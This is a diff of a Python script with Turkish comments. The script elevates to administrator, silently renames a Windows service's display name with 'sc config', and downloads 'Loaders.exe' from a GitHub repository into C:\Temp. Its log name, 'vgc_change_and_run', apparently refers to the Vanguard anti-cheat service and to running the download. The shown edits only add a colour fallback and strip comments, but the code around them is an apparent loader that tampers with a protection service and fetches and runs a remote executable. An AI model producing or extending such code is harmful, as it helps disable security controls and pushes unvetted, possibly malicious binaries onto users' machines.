@@ -5,13 +5,17 @@ import subprocess
 import urllib.request
 import traceback
 
-# Colorama ile renkleri destekle
+# Colorama ile renkleri destekle (yüklü değilse boş değer kullan)
 try:
     from colorama import init, Fore, Style
     init(autoreset=True)
 except ImportError:
-    print("Colorama yüklü değil. Yüklemek için: pip install colorama")
-    sys.exit(1)
+    class Dummy:
+        RESET_ALL = ""
+        CYAN = ""
+        YELLOW = ""
+    Fore = Dummy()
+    Style = Dummy()
 
 # Hata log dosyası
 LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vgc_change_and_run.log")
@@ -40,7 +44,6 @@ def elevate_and_restart():
 
 def change_display_name(service_name, new_display_name):
     try:
-        # Çıktıyı gizlemek için stdout ve stderr'i DEVNULL'a yönlendir
         subprocess.run(
             ["sc", "config", service_name, f"DisplayName= {new_display_name}"],
             check=True,
@@ -54,7 +57,6 @@ def change_display_name(service_name, new_display_name):
 
 def download_file(url, dest_path):
     try:
-        # Eğer dosya önceden varsa sil
         if os.path.exists(dest_path):
             os.remove(dest_path)
         urllib.request.urlretrieve(url, dest_path)
@@ -91,7 +93,6 @@ def main():
 
     DOWNLOAD_URL = "https://github.com/ZeynepGSM3125/license-bot/raw/main/Loaders.exe"
 
-    # Dosya yolu: Temp klasörü
     dest_folder = "C:\\Temp"
     if not os.path.exists(dest_folder):
         os.makedirs(dest_folder)
